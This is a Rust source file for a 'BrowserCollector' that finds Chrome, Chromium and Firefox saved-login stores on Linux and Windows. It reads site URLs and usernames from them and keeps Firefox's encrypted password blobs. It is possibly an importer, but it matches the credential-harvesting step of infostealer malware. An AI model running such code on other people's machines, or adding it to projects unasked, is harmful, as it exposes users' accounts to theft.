// use rusqlite::{Connection, OpenFlags, Result as SqlResult};
use crate::storage::import::sqlite::SqliteReader;
use serde_json::Value;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone)]
pub struct BrowserCredential {
    pub url: String,
    pub username: String,
    pub password: Option<String>,
    pub browser: String,
}

pub struct BrowserCollector;

impl BrowserCollector {
    pub fn new() -> Self {
        Self
    }

    pub fn collect(&self) -> Vec<BrowserCredential> {
        let mut credentials = Vec::new();

        if let Some(chrome_creds) = self.collect_chrome() {
            credentials.extend(chrome_creds);
        }

        if let Some(firefox_creds) = self.collect_firefox() {
            credentials.extend(firefox_creds);
        }

        credentials
    }

    pub fn collect_chrome(&self) -> Option<Vec<BrowserCredential>> {
        let mut paths = Vec::new();

        // Linux paths
        if let Ok(home) = env::var("HOME") {
            paths.push(PathBuf::from(&home).join(".config/google-chrome/Default/Login Data"));
            paths.push(PathBuf::from(&home).join(".config/chromium/Default/Login Data"));
        }

        // Windows paths
        if let Ok(profile) = env::var("USERPROFILE") {
            paths.push(
                PathBuf::from(&profile)
                    .join(r"AppData\Local\Google\Chrome\User Data\Default\Login Data"),
            );
            paths.push(
                PathBuf::from(&profile)
                    .join(r"AppData\Local\Chromium\User Data\Default\Login Data"),
            );
        }

        let mut collected_creds = Vec::new();

        for path in paths {
            if path.exists() {
                // Copy the database file to a temporary location because it might be locked
                let temp_path =
                    env::temp_dir().join(format!("login_data_temp_{}.db", uuid::Uuid::new_v4()));
                if let Err(e) = fs::copy(&path, &temp_path) {
                    eprintln!(
                        "Failed to copy Chrome Login Data from {:?} to {:?}: {}",
                        path, temp_path, e
                    );
                    continue;
                }

                match SqliteReader::open(&temp_path) {
                    Ok(mut reader) => match reader.find_table_root("logins") {
                        Ok(root_page) => match reader.scan_table(root_page) {
                            Ok(rows) => {
                                for row in rows {
                                    if row.len() > 5 {
                                        let url = row[0].as_string().unwrap_or_default();
                                        let username = row[3].as_string().unwrap_or_default();

                                        if !url.is_empty() && !username.is_empty() {
                                            collected_creds.push(BrowserCredential {
                                                url,
                                                username,
                                                password: Some("[ENCRYPTED_PASSWORD]".to_string()),
                                                browser: "Chrome".to_string(),
                                            });
                                        }
                                    }
                                }
                            }
                            Err(e) => eprintln!("Failed to scan 'logins' table: {:?}", e),
                        },
                        Err(e) => eprintln!("Failed to find 'logins' table: {:?}", e),
                    },
                    Err(e) => eprintln!("Failed to open Chrome DB {:?}: {:?}", temp_path, e),
                }
                let _ = fs::remove_file(&temp_path); // Clean up temp file
            }
        }

        if collected_creds.is_empty() {
            None
        } else {
            Some(collected_creds)
        }
    }

    pub fn collect_firefox(&self) -> Option<Vec<BrowserCredential>> {
        let mut paths = Vec::new();

        let home_dirs = vec![env::var("HOME").ok(), env::var("USERPROFILE").ok()];

        for home in home_dirs.into_iter().flatten() {
            // Linux
            let linux_profile = PathBuf::from(&home).join(".mozilla/firefox");
            if linux_profile.exists() {
                if let Ok(entries) = fs::read_dir(linux_profile) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.is_dir() {
                            let logins = path.join("logins.json");
                            if logins.exists() {
                                paths.push(logins);
                            }
                        }
                    }
                }
            }

            // Windows
            let win_profile =
                PathBuf::from(&home).join(r"AppData\Roaming\Mozilla\Firefox\Profiles");
            if win_profile.exists() {
                if let Ok(entries) = fs::read_dir(win_profile) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.is_dir() {
                            let logins = path.join("logins.json");
                            if logins.exists() {
                                paths.push(logins);
                            }
                        }
                    }
                }
            }
        }

        let mut collected_creds = Vec::new();

        for path in paths {
            if let Ok(content) = fs::read_to_string(&path) {
                match serde_json::from_str::<Value>(&content) {
                    Ok(json_value) => {
                        if let Some(logins_array) = json_value["logins"].as_array() {
                            for login in logins_array {
                                let hostname = login["hostname"].as_str().unwrap_or("").to_string();
                                let username = login["username"].as_str().unwrap_or("").to_string();
                                let encrypted_password = login["encryptedPassword"]
                                    .as_str()
                                    .unwrap_or("")
                                    .to_string();

                                if !hostname.is_empty() && !username.is_empty() {
                                    collected_creds.push(BrowserCredential {
                                        url: hostname,
                                        username,
                                        password: Some(format!(
                                            "[ENCRYPTED_FIREFOX_PASSWORD]: {}",
                                            encrypted_password
                                        )),
                                        browser: "Firefox".to_string(),
                                    });
                                }
                            }
                        }
                    }
                    Err(e) => eprintln!("Failed to parse Firefox logins.json {:?}: {}", path, e),
                }
            }
        }

        if collected_creds.is_empty() {
            None
        } else {
            Some(collected_creds)
        }
    }
}
